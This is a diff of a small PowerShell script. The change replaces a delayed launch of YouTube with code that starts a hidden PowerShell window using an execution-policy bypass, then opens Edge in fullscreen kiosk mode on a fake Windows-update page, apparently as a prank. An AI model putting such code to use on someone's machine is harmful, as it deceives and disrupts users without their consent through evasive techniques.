@@ -1,11 +1,10 @@
-# Create a background script block
-$scriptBlock = {
-    Start-Sleep -Seconds 10
-    Start-Process "https://www.youtube.com"
-}
+$kioskUrl = "https://fakeupdate.net/win10ue/"
 
-# Run in background job
-$job = Start-Job -ScriptBlock $scriptBlock
+Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList @(
+    "-NoProfile",
+    "-ExecutionPolicy", "Bypass",
+    "-Command",
+    "Start-Sleep -Seconds 10; Start-Process 'msedge.exe' '--kiosk $kioskUrl --edge-kiosk-type=fullscreen --no-first-run'"
+)
 
-# Exit immediately - job continues running
-Exit
+exit
